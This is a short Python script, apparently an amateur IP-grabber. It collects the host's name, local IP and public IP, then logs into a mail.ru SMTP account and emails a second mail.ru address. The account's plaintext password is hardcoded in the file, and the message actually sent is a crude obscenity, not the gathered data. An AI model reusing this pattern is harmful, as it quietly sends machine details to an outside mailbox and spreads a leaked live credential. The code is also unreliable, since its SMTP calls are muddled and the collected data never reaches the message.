import socket
from requests import get
import smtplib as smtp
import getpass

# file = open('log.txt', 'w')

host = socket.gethostname()
local_ip = socket.gethostbyname(host)
public_ip = get('http://api.ipify.org').text

print(f'Host: {host}')
print(f'Local IP: {local_ip}')
print(f'Public IP: {public_ip}')

src_mail = 'pecik_228@mail.ru'
password = 'uuQsFq9RiJMxgRmiwLuD'

dest_mail = 'sadtrollface@mail.ru'
mail_subject = 'IP'
mail_text = 'IP information'

# message = 'From: {}\nTo: {}\nSubject: {}\nText: {}\n'.format(src_mail, dest_mail, mail_subject, mail_text)
message = 'suck dick'

server = smtp.SMTP_SSL('smtp.mail.ru')
server.login(src_mail, password)
server.auth_plain()
server.sendmail(src_mail, dest_mail, message)
server.quit()

# file.close()